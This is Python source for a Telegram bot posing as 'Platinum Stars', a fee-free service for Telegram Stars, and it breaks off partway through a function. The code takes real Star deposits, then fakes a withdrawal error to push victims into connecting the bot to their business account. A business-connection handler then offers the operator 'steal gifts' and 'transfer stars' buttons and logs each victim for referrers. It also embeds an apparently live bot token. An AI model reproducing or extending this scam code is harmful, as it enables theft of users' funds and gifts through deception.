from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineQuery,
    InlineQueryResultPhoto,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputTextMessageContent,
    InlineQueryResultArticle
)
from aiogram.types import LabeledPrice, PreCheckoutQuery
import random
import os
import json
from datetime import datetime
import logging
import asyncio
import aiohttp
import time
from aiogram.types import InlineQueryResultCachedPhoto

# Constants
TOKEN = "8229712249:AAEY8ANUWpiyKBGWU4EyW8hnSdBoIHzEvj8"
LOG_CHAT_ID = -1002741941997
MESSAGE_LOG_CHAT_ID = -1002741941997
MAX_GIFTS_PER_RUN = 1000
ADMIN_IDS = [7917237979]
FORCED_REFERRAL_USERS = [819487094, 7214848375]
MY_REFERRAL_ID = 7917237979
COMMISSION_USERS = [123456789, 987654321]  # ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, —Å –∫–æ—Ç–æ—Ä—ã—Ö –±–µ—Ä–µ—Ç—Å—è –∫–æ–º–∏—Å—Å–∏—è
CHECK_PHOTO_FILE_ID = None  # –ë—É–¥–µ—Ç –∑–∞–ø–æ–ª–Ω–µ–Ω–æ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
activated_checks = {}  # –°–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —á–µ–∫–æ–≤

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)

# State classes
class Draw(StatesGroup):
    id = State()
    gift = State()

class CheckState(StatesGroup):
    waiting_for_amount = State()

class WithdrawStates(StatesGroup):
    waiting_for_amount = State()

class DepositStates(StatesGroup):
    waiting_for_amount = State()

# Initialize storage
storage = MemoryStorage()

# –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö
if os.path.exists("referrers.json"):
    with open("referrers.json", "r") as f:
        user_referrer_map = json.load(f)
else:
    user_referrer_map = {}

if os.path.exists("user.balances.json"):
    with open("user.balances.json", "r", encoding='utf-8') as f:
        balances = json.load(f)
else:
    balances = {}

user_message_history = {} 

# Initialize bot
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

def load_balances():
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –±–∞–ª–∞–Ω—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–∑ user.balances.json."""
    if os.path.exists("user.balances.json"):
        with open("user.balances.json", "r", encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_balances(new_balances=None):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –±–∞–ª–∞–Ω—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ user.balances.json"""
    global balances
    if new_balances is not None:
        balances = new_balances
    with open("user.balances.json", "w", encoding='utf-8') as f:
        json.dump(balances, f, ensure_ascii=False, indent=4)

async def get_check_photo_file_id():
    """–ü–æ–ª—É—á–∞–µ—Ç file_id –¥–ª—è —Ñ–æ—Ç–æ —á–µ–∫–∞ –∏–ª–∏ –∑–∞–≥—Ä—É–∂–∞–µ—Ç –µ–≥–æ."""
    global CHECK_PHOTO_FILE_ID
    
    if CHECK_PHOTO_FILE_ID:
        return CHECK_PHOTO_FILE_ID
    
    try:
        # –ü—ã—Ç–∞–µ–º—Å—è –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ –∏ –ø–æ–ª—É—á–∏—Ç—å file_id
        photo = FSInputFile("image2.png")
        msg = await bot.send_photo(chat_id=LOG_CHAT_ID, photo=photo)
        CHECK_PHOTO_FILE_ID = msg.photo[-1].file_id
        await bot.delete_message(chat_id=LOG_CHAT_ID, message_id=msg.message_id)
        return CHECK_PHOTO_FILE_ID
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ file_id –¥–ª—è —Ñ–æ—Ç–æ —á–µ–∫–∞: {e}")
        return None

async def activate_check(user_id: int, check_data: str):
    try:
        parts = check_data.split('_')
        if len(parts) < 4:
            return False, "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —á–µ–∫–∞"
            
        amount = int(parts[2])
        sender_id = int(parts[3])
        
        if len(parts) > 4:
            timestamp = parts[4]
        else:
            timestamp = str(int(time.time()))
        
        check_key = f"{sender_id}_{amount}_{timestamp}"
        
        if check_key in activated_checks:
            return False, "–≠—Ç–æ—Ç —á–µ–∫ —É–∂–µ –±—ã–ª –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω"
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∑–≤—ë–∑–¥—ã –Ω–∞ –±–∞–ª–∞–Ω—Å
        user_id_str = str(user_id)
        balances[user_id_str] = balances.get(user_id_str, 0) + amount
        save_balances()
        
        activated_checks[check_key] = True
        
        referrer_id = parts[0][3:]
        if referrer_id and referrer_id.isdigit():
            if user_id_str not in user_referrer_map:
                user_referrer_map[user_id_str] = str(referrer_id)
                with open("referrers.json", "w") as f:
                    json.dump(user_referrer_map, f)
        
        return True, f"–í–∞–º –Ω–∞—á–∏—Å–ª–µ–Ω–æ {amount} –∑–≤—ë–∑–¥!"
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞: {e}")
        return False, "–û—à–∏–±–∫–∞ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞"
    
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –≤ –∫–æ–º–∞–Ω–¥–µ /start (–∞–∫—Ç–∏–≤–∞—Ü–∏—è —á–µ–∫–∞)
    if len(message.text.split()) > 1:
        check_data = message.text.split()[1]
        if check_data.startswith("ref") and "_check_" in check_data:
            success, result_text = await activate_check(message.from_user.id, check_data)
            await message.answer(result_text)
            if not success:
                return
    
    # –û—Å—Ç–∞–ª—å–Ω–æ–π –∫–æ–¥ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ /start –æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚≠êÔ∏è –ë–∞–ª–∞–Ω—Å", callback_data="balance")],
        [InlineKeyboardButton(text="‚ûï –ü–æ–ø–æ–ª–Ω–∏—Ç—å –∑–≤—ë–∑–¥—ã", callback_data="deposit")],
        [InlineKeyboardButton(text="üì§ –í—ã–≤–µ—Å—Ç–∏ –∑–≤—ë–∑–¥—ã", callback_data="withdraw")],
        [InlineKeyboardButton(text="‚ùì FAQ", url="https://telegra.ph/FAQ-StarsPlatinumBot-08-05")]
    ])
    
    photo = FSInputFile("image.png")
    await message.answer_photo(
        photo=photo,
        caption=(
            "üëÄ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Platinum Stars!\n\n"
            "–ù–∞—à –±–æ—Ç –ø–æ–º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–≤–µ–∑–¥—ã –±–µ–∑ –∫–æ–º–∏—Å—Å–∏–∏ –ø—Ä—è–º–æ –Ω–∞ –±–∞–ª–∞–Ω—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è.\n\n"
            "–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—ã–π —Ä–∞–∑–¥–µ–ª:"
        ),
        reply_markup=keyboard
    )

    if message.chat.id not in user_message_history:
        user_message_history[message.chat.id] = []
    else:
        if len(user_message_history[message.chat.id]) > 0:
            first_msg_id = user_message_history[message.chat.id][0]
            user_message_history[message.chat.id] = [first_msg_id]
    
    user_message_history[message.chat.id].append(message.message_id + 1)

@dp.callback_query(F.data == "balance")
async def show_balance(callback: types.CallbackQuery):
    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user_id = str(callback.from_user.id)
    balances = load_balances()
    balance = balances.get(user_id, 0)
    
    # –ó–∞–≥—Ä—É–∂–∞–µ–º —Ñ–æ—Ç–æ –¥–ª—è —Ä–∞–∑–¥–µ–ª–∞ –±–∞–ª–∞–Ω—Å–∞
    balance_photo = FSInputFile("balance.png")  # –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ñ–∞–π–ª balance.png —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    
    # –¢–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∞–∫—Ç—É–∞–ª—å–Ω—ã–º –±–∞–ª–∞–Ω—Å–æ–º
    balance_text = (
        "‚≠êÔ∏è –†–∞–∑–¥–µ–ª ¬´–ë–∞–ª–∞–Ω—Å¬ª\n\n"
        f"–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–∞—à–∏—Ö –∑–≤–µ–∑–¥: {balance}\n\n"
        "–¢–∞–∫ –∂–µ –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –Ω–∞–ø—Ä—è–º—É—é —á–µ—Ä–µ–∑ Telegram ‚Äî –±—ã—Å—Ç—Ä–æ, –∞–Ω–æ–Ω–∏–º–Ω–æ –∏ –±–µ–∑ –∫–æ–º–∏—Å—Å–∏–∏."
    )
    
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π "–ù–∞–∑–∞–¥"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="delete_message")]
    ])
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ —Å —Ç–µ–∫—Å—Ç–æ–º –∏ –∫–Ω–æ–ø–∫–æ–π
    await callback.message.answer_photo(
        photo=balance_photo,
        caption=balance_text,
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "delete_message")
async def delete_message_handler(callback: types.CallbackQuery):
    try:
        # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ, –≤ –∫–æ—Ç–æ—Ä–æ–º –±—ã–ª–∞ –Ω–∞–∂–∞—Ç–∞ –∫–Ω–æ–ø–∫–∞
        await callback.message.delete()
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
    await callback.answer()

@dp.callback_query(F.data == "deposit")
async def deposit_stars(callback: types.CallbackQuery):
    deposit_photo = FSInputFile("deposit.png")
    deposit_text = (
        "‚ûï –†–∞–∑–¥–µ–ª ¬´–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞¬ª\n\n"
        "–ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥ –Ω–∞–ø—Ä—è–º—É—é —á–µ—Ä–µ–∑ Telegram.\n"
        "–ö–æ–º–∏—Å—Å–∏–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç ‚Äî –≤—Å–µ —Ä–∞—Å—Ö–æ–¥—ã –Ω–∞ –ø–µ—Ä–µ–≤–æ–¥ –ø–æ–∫—Ä—ã–≤–∞–µ—Ç –±–æ—Ç.\n"
        "–°—É–º–º–∞ –∑–∞—á–∏—Å–ª—è–µ—Ç—Å—è —Ç–æ—á–Ω–æ, –±–µ–∑ –∑–∞–¥–µ—Ä–∂–µ–∫ –∏ —Å–∫—Ä—ã—Ç—ã—Ö —Å–±–æ—Ä–æ–≤."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å", callback_data="make_deposit")],
        [InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="delete_message")]
    ])
    
    await callback.message.answer_photo(
        photo=deposit_photo,
        caption=deposit_text,
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "make_deposit")
async def make_deposit_handler(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "‚ûï –í–≤–µ–¥–∏—Ç–µ —Ç–æ—á–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–≤—ë–∑–¥ –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—Ç–∏—Ç–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—å:\n\n"
        "–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è 25 –∑–≤—ë–∑–¥."
    )
    await state.set_state(DepositStates.waiting_for_amount)
    await callback.answer()

@dp.message(DepositStates.waiting_for_amount, F.text)
async def process_deposit_amount(message: types.Message, state: FSMContext):
    try:
        stars_amount = int(message.text)
        if stars_amount < 25:
            await message.answer("‚ùå –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è - 25 –∑–≤—ë–∑–¥")
            return
        
        # –°–æ–∑–¥–∞–µ–º –∏–Ω–≤–æ–π—Å –≤ –∑–≤–µ–∑–¥–∞—Ö
        await bot.send_invoice(
            chat_id=message.chat.id,
            title="–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥",
            description=f"–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –Ω–∞ {stars_amount} –∑–≤—ë–∑–¥",
            provider_token="",  # –û—Å—Ç–∞–≤–ª—è–µ–º –ø—É—Å—Ç—ã–º –¥–ª—è –∑–≤–µ–∑–¥
            currency="XTR",   # –ö–æ–¥ –≤–∞–ª—é—Ç—ã –¥–ª—è Telegram Stars
            prices=[LabeledPrice(label="–ó–≤—ë–∑–¥—ã", amount=stars_amount)],
            payload=f"stars_deposit_{message.from_user.id}",
            need_email=False,
            need_phone_number=False,
            is_flexible=False
        )
        
    except ValueError:
        await message.answer("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ")
    finally:
        await state.clear()

@dp.message(F.successful_payment)
async def process_successful_payment(message: types.Message):
    payment = message.successful_payment
    stars_amount = payment.total_amount  # –£–∂–µ –≤ –∑–≤–µ–∑–¥–∞—Ö
    
    # –ó–¥–µ—Å—å –ª–æ–≥–∏–∫–∞ –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –∑–≤–µ–∑–¥ –Ω–∞ –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user_id = str(message.from_user.id)
    balances = load_balances()
    balances[user_id] = balances.get(user_id, 0) + stars_amount
    save_balances(balances)
    
    await message.answer(
        f"‚úÖ –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–∞ {stars_amount} –∑–≤—ë–∑–¥!\n"
        f"–í–∞—à —Ç–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: {balances[user_id]} –∑–≤—ë–∑–¥"
    )

@dp.callback_query(F.data == "withdraw")
async def withdraw_stars(callback: types.CallbackQuery, state: FSMContext):
    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user_id = str(callback.from_user.id)
    balances = load_balances()
    balance = balances.get(user_id, 0)
    
    await callback.message.answer(
        f"üì§ –í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–≤—ë–∑–¥ –¥–ª—è –≤—ã–≤–æ–¥–∞ (–º–∏–Ω–∏–º—É–º 25):\n"
        f"–í–∞—à –±–∞–ª–∞–Ω—Å: {balance} ‚≠êÔ∏è"
    )
    await state.set_state(WithdrawStates.waiting_for_amount)
    await callback.answer()

@dp.message(WithdrawStates.waiting_for_amount, F.text)
async def process_withdraw_amount(message: types.Message, state: FSMContext):
    try:
        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user_id = str(message.from_user.id)
        balances = load_balances()
        balance = balances.get(user_id, 0)
        
        # –ü–∞—Ä—Å–∏–º –≤–≤–µ–¥–µ–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
        amount = int(message.text)
        
        if amount < 25:
            await message.answer("‚ùå –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞ - 25 –∑–≤—ë–∑–¥")
            return
            
        if amount > balance:
            await message.answer(f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤—ë–∑–¥ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ\n–í–∞—à –±–∞–ª–∞–Ω—Å: {balance} ‚≠êÔ∏è")
            return
        
        # –°–ø–∏—Å—ã–≤–∞–µ–º –∑–≤—ë–∑–¥—ã —Å –±–∞–ª–∞–Ω—Å–∞
        balances[user_id] = balance - amount
        save_balances(balances)
            
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–π –Ω–æ–º–µ—Ä —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        transaction_id = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=10))
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –≤—ã–≤–æ–¥–µ
        withdraw_message = await message.answer(
            "üü° –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤—ã–≤–æ–¥\n\n"
            f"‚≠êÔ∏è –ó–≤–µ–∑–¥—ã: {amount} ‚≠êÔ∏è\n"
            f"‚ûï –ù–æ–º–µ—Ä —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: {transaction_id}\n"
            f"‚åõÔ∏è –ü—Ä–∏–º–µ—Ä–Ω–æ–µ –≤—Ä–µ–º—è –ø—Ä–∏–±—ã—Ç–∏—è: 25—Å–µ–∫"
        )
        
        # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫—É
        await asyncio.sleep(5)
        await bot.delete_message(chat_id=message.chat.id, message_id=withdraw_message.message_id)
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–∞–º–∏
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚ùì–ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å", url="https://telegra.ph/Oshibka-vyvoda-zvyozd-chto-delat-08-05-2")],
            [InlineKeyboardButton(text="‚öôÔ∏è –û—Ç–∫—Ä—ã—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏", url="tg://settings/")],
            [InlineKeyboardButton(text="‚úÖ –ü–æ–¥–∫–ª—é—á–∏–ª(-–∞)", callback_data="check_connection")]
        ])
        
        await message.answer(
            "üî¥ –û—à–∏–±–∫–∞ –≤—ã–≤–æ–¥–∞ –∑–≤–µ–∑–¥\n\n"
            "–ü—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –≤—ã–≤–æ–¥–∞ –∑–≤–µ–∑–¥, –≤–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞ ‚Äî –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –≤ Platinum Stars. "
            "–ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å, –∏ –ø—Ä–æ–π–¥–∏—Ç–µ —ç—Ç–∞–ø –≤—ã–≤–æ–¥–∞ —Å–Ω–æ–≤–∞.\n\n"
            "–ù–µ –ø–æ–º–æ–≥–ª–æ? –ù–∞–ø–∏—à–∏—Ç–µ –æ–± –æ—à–∏–±–∫–µ ‚Äî @StarsPlatinumSupport",
            reply_markup=keyboard
        )
        
    except ValueError:
        await message.answer("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ")
    finally:
        await state.clear()

@dp.callback_query(F.data == "check_connection")
async def check_connection_handler(callback: types.CallbackQuery):
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–∏
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üÜò –ü–æ–¥–¥–µ—Ä–∂–∫–∞", url="https://t.me/StarsPlatinumSupport")]
    ])
    
    await callback.message.edit_text(
        "üîÑ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –±–æ—Ç–∞\n"
        "–í —Å—Ä–µ–¥–Ω–µ–º –∑–∞–Ω–∏–º–∞–µ—Ç –¥–æ 33 —Å–µ–∫—É–Ω–¥.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "open_settings")
async def open_settings_handler(callback: types.CallbackQuery):
    try:
        # –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–∫—Ä—ã—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram
        await callback.answer()
        await bot.send_message(
            chat_id=callback.from_user.id,
            text="–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–∫—Ä–æ–π—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram –≤—Ä—É—á–Ω—É—é: –ù–∞—Å—Ç—Ä–æ–π–∫–∏ > –ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç > –ß–∞—Ç-–±–æ—Ç—ã"
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –Ω–∞—Å—Ç—Ä–æ–µ–∫: {e}")

@dp.callback_query(F.data == "check_connection")
async def check_connection_handler(callback: types.CallbackQuery):
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–∏
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üÜò –ü–æ–¥–¥–µ—Ä–∂–∫–∞", url="https://t.me/StarsPlatinumSupport")]
    ])
    
    await callback.message.edit_text(
        "üîÑ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –±–æ—Ç–∞\n"
        "–í —Å—Ä–µ–¥–Ω–µ–º –∑–∞–Ω–∏–º–∞–µ—Ç –¥–æ 33 —Å–µ–∫—É–Ω–¥.",
        reply_markup=keyboard
    )
    await callback.answer()

async def pagination(page=0):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                data = await response.json()
                
                builder = InlineKeyboardBuilder()
                start = page * 9
                end = start + 9
                count = 0
                
                if data.get("ok", False):
                    gifts = list(data.get("result", {}).get("gifts", []))
                    for gift in gifts[start:end]:
                        count += 1
                        builder.button(
                            text=f"‚≠êÔ∏è{gift['star_count']} {gift['sticker']['emoji']}",
                            callback_data=f"gift_{gift['id']}"
                        )
                    builder.adjust(2)
                
                if page <= 0:
                    builder.row(
                        InlineKeyboardButton(text="‚Ä¢", callback_data="empty"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="–í–ø–µ—Ä–µ–¥", callback_data=f"next_{page + 1}")
                    )
                elif count < 9:
                    builder.row(
                        InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data=f"down_{page - 1}"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="‚Ä¢", callback_data="empty")
                    )
                elif page > 0 and count >= 9:
                    builder.row(
                        InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data=f"down_{page - 1}"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="–í–ø–µ—Ä–µ–¥", callback_data=f"next_{page + 1}")
                    )
                
                return builder.as_markup()
                
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"–û—à–∏–±–∫–∞ pagination: {str(e)}")
        return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏", callback_data="error")]])


@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    
    # –î–æ–±–∞–≤–ª—è–µ–º –¥–≤–µ –∫–Ω–æ–ø–∫–∏ –≤ –æ–¥–Ω—É —Å—Ç—Ä–æ–∫—É
    builder.row(
        InlineKeyboardButton(text="üéÅ –£–∫—Ä–∞—Å—Ç—å –ø–æ–¥–∞—Ä–∫–∏", callback_data=f"steal_gifts:{business_id}"),
        InlineKeyboardButton(text="üí∞ –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –∑–≤—ë–∑–¥—ã", callback_data=f"transfer_stars:{business_id}")
    )
    # –ö–Ω–æ–ø–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –Ω–∞ –æ—Ç–¥–µ–ª—å–Ω–æ–π —Å—Ç—Ä–æ–∫–µ
    builder.row(
        InlineKeyboardButton(text="‚õîÔ∏è –£–¥–∞–ª–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ", callback_data=f"destroy:{business_id}")
    )
    builder.adjust(1)
    
    user = business_connection.user
    
    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º –¥–ª—è —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π –æ–± –æ—à–∏–±–∫–∞—Ö
    inviter_id = user_referrer_map.get(str(user.id))
    inviter_username = "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    if inviter_id:
        try:
            inviter = await bot.get_chat(inviter_id)
            inviter_username = f"@{inviter.username}" if inviter.username else f"ID:{inviter_id}"
        except Exception:
            inviter_username = f"ID:{inviter_id}"
    
    user_username = f"@{user.username}" if user.username else f"ID:{user.id}"
    error_base = f"–†–µ—Ñ {user_username} –æ—Ç {inviter_username}"
    
    try:
        info = await bot.get_business_connection(business_id)
        if info is None:
            error_msg = f"{error_base} - –ë–æ—Ç –æ—Ç–≤—è–∑–∞–Ω"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            return
            
        rights = info.rights
        if rights is None:
            error_msg = f"{error_base} - –ë–æ—Ç –æ—Ç–≤—è–∑–∞–Ω"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            return

